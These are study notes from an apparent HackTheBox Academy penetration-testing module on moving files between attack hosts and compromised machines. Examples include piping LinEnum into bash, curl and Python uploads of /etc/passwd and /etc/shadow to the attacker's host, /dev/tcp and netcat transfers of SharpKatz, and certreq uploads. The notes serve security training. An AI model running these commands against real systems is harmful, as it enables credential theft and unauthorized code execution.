      C:\htb> ftp -v -n -s:ftpcommand.txt
      ftp> open 192.168.49.128
      
      Log in with USER and PASS first.
      
      
      ftp> USER anonymous
      ftp> PUT c:\windows\system32\drivers\etc\hosts
      ftp> bye
-=-=-=-
[+] Linux File Transfer Methods
+ Download Operations
  > We have access to the machine NIX04, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple file download methods.
  * Base64 Encoding / Decoding
    > Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.
      m1l0js@htb[/htb]$ md5sum id_rsa
    > We use cat to print the file content, and base64 encode the output using a pipe |. We used the option -w 0 to create only one line and ended up with the command with a semi-colon (;) and echo keyword to start a new line and make it easier to copy.
      m1l0js@htb[/htb]$ cat id_rsa |base64 -w 0;echo
    > We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d' to decode it.
      m1l0js@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
    > Finally, we can confirm if the file was transferred successfully using the md5sum command.
      md5sum id_rsa
    > Note: You can also upload files using the reverse operation.

  * Web Downloads with Wget and cURL
    > Two of the most common utilities in Linux distributions to interact with web applications are wget and curl. These tools are installed on many Linux distributions.
    > To download a file using wget, we need to specify the URL and the option `-O' to set the output filename.
      m1l0js@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
      m1l0js@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

  * Fileless Attacks Using Linux
    > Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
    > Note: Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload choosen it may create temporary files on the OS.
    > Let's take the cURL command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.
      m1l0js@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
    > Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using wget.
      m1l0js@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
  * Download with Bash (/dev/tcp)
    > There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
      m1l0js@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80 #Connect to the target webserver
      m1l0js@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 #HTTP GET Request
      m1l0js@htb[/htb]$ cat <&3 #Print the response
  * SSH Downloads
    > SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
    > SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.
    > SCP is very similar to copy or cp, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.
    > Before we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.
      m1l0js@htb[/htb]$ sudo systemctl enable ssh
      m1l0js@htb[/htb]$ sudo systemctl start ssh
      m1l0js@htb[/htb]$ netstat -lnpt
    > Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.
      m1l0js@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
    > Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer. 
[+] Upload Operations
  > There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.
  * Web Upload
    > As mentioned in the Windows File Transfer Methods section, we can use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page. For this Linux example, let's see how we can configure the uploadserver module to use HTTPS for secure communication.
    > The first thing we need to do is to install the uploadserver module.
      m1l0js@htb[/htb]$ python3 -m pip install --user uploadserver
    > Now we need to create a certificate. In this example, we are using a self-signed certificate.
      m1l0js@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
    > The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
      m1l0js@htb[/htb]$ mkdir https && cd https
      m1l0js@htb[/htb]$ python3 -m uploadserver 443 --server-certificate /root/server.pem
    > Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.
      m1l0js@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
    > We used the option --insecure because we used a self-signed certificate that we trust.

  * Alternative Web File Transfer Method
    > Since Linux distributions usually have Python or php installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.
    > It is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.
      Linux - Creating a Web Server with python3
        m1l0js@htb[/htb]$ python3 -m http.server
      Linux - Creating a Web Server with Python2.7
        m1l0js@htb[/htb]$ python2.7 -m SimpleHTTPServer
      Linux - Creating a Web Server with PHP
        m1l0js@htb[/htb]$ php -S 0.0.0.0:8000
      Linux - Creating a Web Server with Ruby
        m1l0js@htb[/htb]$ ruby -run -ehttpd . -p8000
    > Download the File from the Target Machine onto the Pwnbox
      m1l0js@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
    > Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

  * SCP Upload
    > We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the scp utility to upload files. Let's attempt to upload a file using the SSH protocol.
    > File Upload using SCP
      m1l0js@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

[+] Transfering files with code
  > It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.
  > We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.
  > According to Wikipedia, there are around 700 programming languages, and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.
  * Python
    > Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exits. Python can run one-liners from an operating system command line using the option -c. Let's see some examples:
      m1l0js@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
      m1l0js@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
  * PHP
    > PHP is also very prevalent and provides multiple file transfer methods. According to W3Techs' data, PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.
    > Let's see some examples of downloading files using PHP.
    > In the following example, we will use the PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.
      m1l0js@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
    > An alternative to file_get_contents() and file_put_contents() is the fpopen() module. We can use this module to open a URL, read it's content and save it into a file.
      m1l0js@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    > We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.
      m1l0js@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
    > Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled. 
    
  * Other languages
    > Ruby and Perl are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option -e.
      m1l0js@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
      m1l0js@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
    > JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things. The following JavaScript code is based on this post(https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068), and we can download a file using it. We'll create a file called wget.js and save the following content:
      var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
      WinHttpReq.Send();
      BinStream = new ActiveXObject("ADODB.Stream");
      BinStream.Type = 1;
      BinStream.Open();
      BinStream.Write(WinHttpReq.ResponseBody);
      BinStream.SaveToFile(WScript.Arguments(1));
    > We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
      C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
    > VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98. The following VBScript example can be used based on this. We'll create a file called wget.vbs and save the following content:
      dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
      dim bStrm: Set bStrm = createobject("Adodb.Stream")
      xHttp.Open "GET", WScript.Arguments.Item(0), False
      xHttp.Send
      
      with bStrm
          .type = 1
          .open
          .write xHttp.responseBody
          .savetofile WScript.Arguments.Item(1), 2
      end with
    > We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
      C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
  * Upload Operations using Python3
    > If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 requests module allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 uploadserver.
      m1l0js@htb[/htb]$ python3 -m uploadserver 
      m1l0js@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' #Uploading a file using a python one-liner
    > Let's divide this one-liner into multiple lines to understand each piece better.
      # To use the requests function, we need to import the module first.
      import requests 
      # Define the target URL where we will upload the file.
      URL = "http://192.168.49.128:8000/upload"
      # Define the file we want to read, open it and save it in a variable.
      file = open("/etc/passwd","rb")
      # Use a requests POST request to upload the file. 
      r = requests.post(url,files={"files":file})

[+] Miscellaneous file transfer methods
* Netcat 
  > Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.
  > The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.
  > In this section, we will use both the original Netcat and Ncat.
  > Note: Ncat is used in HackTheBox's PwnBox as nc, ncat, and netcat. 
  + File Transfer with Netcat and Ncat
    > The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.
    > In this example, we'll transfer SharpKatz.exe(https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.
    > We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.
      + NetCat - Compromised Machine - Listening on Port 8000
        victim@target:~$ # Example using Original Netcat
        victim@target:~$ nc -l -p 8000 > SharpKatz.exe
    > If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.
      + Ncat - Compromised Machine - Listening on Port 8000
        victim@target:~$ # Example using Ncat
        victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
    > From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
      + Netcat - Attack Host - Sending File to Compromised machine
        m1l0js@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
    > If we use Ncat in our attack host, we can use --send-only instead of -q. --send-only in both connect and listen modes causes Ncat to quit when its input runs out. Usually, it will not stop until the network connection is closed because the remote side may still send something, but in the case of --send-only, there's no reason to receive anything more.
      + Ncat - Attack Host - Sending File to Compromised machine
        m1l0js@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
    > Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.
      + Attack Host - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
      + Compromised Machine Connect to Netcat to Receive the File
        victim@target:~$ # Example using Original Netcat
        victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe

    > Let's do the same with Ncat:
      + Attack Host - Sending File as Input to Ncat
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
      + Compromised Machine Connect to Ncat to Receive the File
        victim@target:~$ # Example using Ncat
        victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
    
    > If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/ (https://tldp.org/LDP/abs/html/devref1.html)
    > Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.
      + NetCat - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Original Netcat
        m1l0js@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

      + Ncat - Sending File as Input to Netcat
        m1l0js@htb[/htb]$ # Example using Ncat
        m1l0js@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
    
      + Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
        victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
    > Note: The same operation can be used to transfer files from the compromised host to our Pwnbox. 

* PowerShell Session File Transfer
  > We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.
  > PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
  > To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.
  > We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.
  > From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
    PS C:\htb> whoami
    htb\administrator
    PS C:\htb> hostname
    DC01
    PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
  > Because this session already has privileges over DATABASE01, we don't need to specify credentials. In the example below, a session is created to the remote computer named DATABASE01 and stores the results in the variable named $Session.
  > Create a PowerShell Remoting Session to DATABASE01
    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
  > We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
  > Copy samplefile.txt from our Localhost to the DATABASE01 Session
    PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
  > Copy DATABASE.txt from DATABASE01 Session to our Localhost
    PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

* RDP
  > RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.
  > If we are connected from Linux, we can use xfreerdp or rdesktop. At the time of writing, xfreerdp and rdesktop allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
  > As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session
  + Mounting a Linux Folder Using rdesktop
    m1l0js@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
  + Mounting a Linux Folder Using xfreerdp
    m1l0js@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
  > To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.
  > Alternatively, from Windows, the native mstsc.exe remote desktop client can be used ==> Local Resources ==> More ==> Drives
  > After selecting the drive, we can interact with it in the remote session
  > Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session. 

[+] Protected File Transfers
  > As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.
  > Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect. 
  > Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.
  > Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.
  * File Encryption on Windows
    > Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the Invoke-AESEncryption.ps1(https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)PowerShell script. This script is small and provides encryption of files and strings.
    > We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.
      PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
    > After the script is imported, it can encrypt strings or files, as shown in the following examples. This command creates an encrypted file with the same name as the encrypted file but with the extension ".aes."
      + File Encryption Example
        PS C:\htb> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
        File encrypted to C:\htb\scan-results.txt.aes
    > Using very strong and unique passwords for encryption for every company where a penetration test is performed is essential. This is to prevent sensitive files and information from being decrypted using one single password that may have been leaked and cracked by a third party.


  * File Encryption on Linux
    > OpenSSL is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.
    > To encrypt a file using openssl we can select different ciphers, see OpenSSL man page. Let's use -aes256 as an example. We can also override the default iterations counts with the option -iter 100000 and add the option -pbkdf2 to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.
      + Encrypting /etc/passwd with openssl
        m1l0js@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
        enter aes-256-cbc encryption password:                                                         
        Verifying - enter aes-256-cbc encryption password:                       
    > Remember to use a strong and unique password to avoid brute-force cracking attacks should an unauthorized party obtain the file. To decrypt the file, we can use the following command:
      + Decrypt passwd.enc with openssl
        m1l0js@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
        enter aes-256-cbc decryption password:


[+] Catching Files over HTTP/S
  > Web transfer is the most common way most people transfer files because HTTP/HTTPS are the most common protocols allowed through firewalls. Another immense benefit is that, in many cases, the file will be encrypted in transit. There is nothing worse than being on a Penetration Test, and a client's network IDS picks up on a sensitive file being transferred over plaintext and having them ask why we sent a password to our cloud server without using encryption.
  > We have already discussed using the Python3 uploadserver module to set up a web server with upload capabilities, but we can also use Apache or Nginx. This section will cover creating a secure web server for file upload operations.
  * Nginx - Enabling PUT
    > A good alternative for transferring files to Apache is Nginx(https://www.nginx.com/resources/wiki/) because the configuration is less complicated, and the module system does not lead to security issues as Apache can.
    > When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this, as the PHP module loves to execute anything ending in PHP. Configuring Nginx to use PHP is nowhere near as simple.
      + Create a Directory to Handle Uploaded Files
        m1l0js@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
      + Change the Owner to www-data
        m1l0js@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
      + Create Nginx Configuration File
        > Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
          server {
              listen 9001;
              
              location /SecretUploadDirectory/ {
                  root    /var/www/uploads;
                  dav_methods PUT;
              }
          }
      + Symlink our Site to the sites-enabled Directory
        m1l0js@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
      + Start Nginx
        m1l0js@htb[/htb]$ sudo systemctl restart nginx.service
      ! If we get any error messages, check /var/log/nginx/error.log. If using Pwnbox, we will see port 80 is already in use.
      + Verifying Errors
        m1l0js@htb[/htb]$ tail -2 `/var/log/nginx/error.log`
        2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: A`ddress already in use`)
        2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
        
        m1l0js@htb[/htb]$ ss -lnpt | grep `80`
        LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))

        m1l0js@htb[/htb]$ ps -ef | grep `2811`
        user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
        root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
      ! We see there is already a module listening on port 80. To get around this, we can remove the default Nginx configuration, which binds on port 80.
      + Remove NginxDefault Configuration
        m1l0js@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default
      > Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt
      + Upload File Using cURL
        m1l0js@htb[/htb]$ curl -T /etc/passwd 
        http://localhost:9001/SecretUploadDirectory/users.txt

        m1l0js@htb[/htb]root@localhost# tail -1 /var/www/upload/SecretUploadDirectory/users.txt 
        user65:x:1000:1000:,,,:/home/user65:/bin/bash
      > Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.



[+] Living off the Land      
  > URLs
    https://lolbas-project.github.io/
    https://gtfobins.github.io/
  > Living off the Land binaries can be used to perform functions such as:
    Download
    Upload
    Command Execution
    File Read
    File Write
    Bypasses
  > This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.

* LOLBAS
  > To search for download and upload functions in LOLBAS we can use /download or /upload.
  > Let's use CertReq.exe as an example.
  > We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.
    + Upload win.ini to our Pwnbox
      C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini
      Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
  > This will send the file to our Netcat session, and we can copy-paste its contents.
    + File Received in our Netcat Session
      m1l0js@htb[/htb]$ sudo nc -lvnp 80
  > If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter. You can download an updated version here(https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.

* GTFOBins
  > To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.


  > Let's use OpenSSL. It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."
  > We need to create a certificate and start a server in our Pwnbox.
    + Create Certificate in our Pwnbox
      m1l0js@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
    + Stand up the Server in our Pwnbox
      m1l0js@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
    ! Next, with the server running, we need to download the file from the compromised machine.
    + Download File from the Compromised Machine
      m1l0js@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

! Other Common Living off the Land tools
  * Bitsadmin Download function
    > The Background Intelligent Transfer Service (BITS ==> https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
      + File Download with Bitsadmin
        PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
    > PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
      + Download
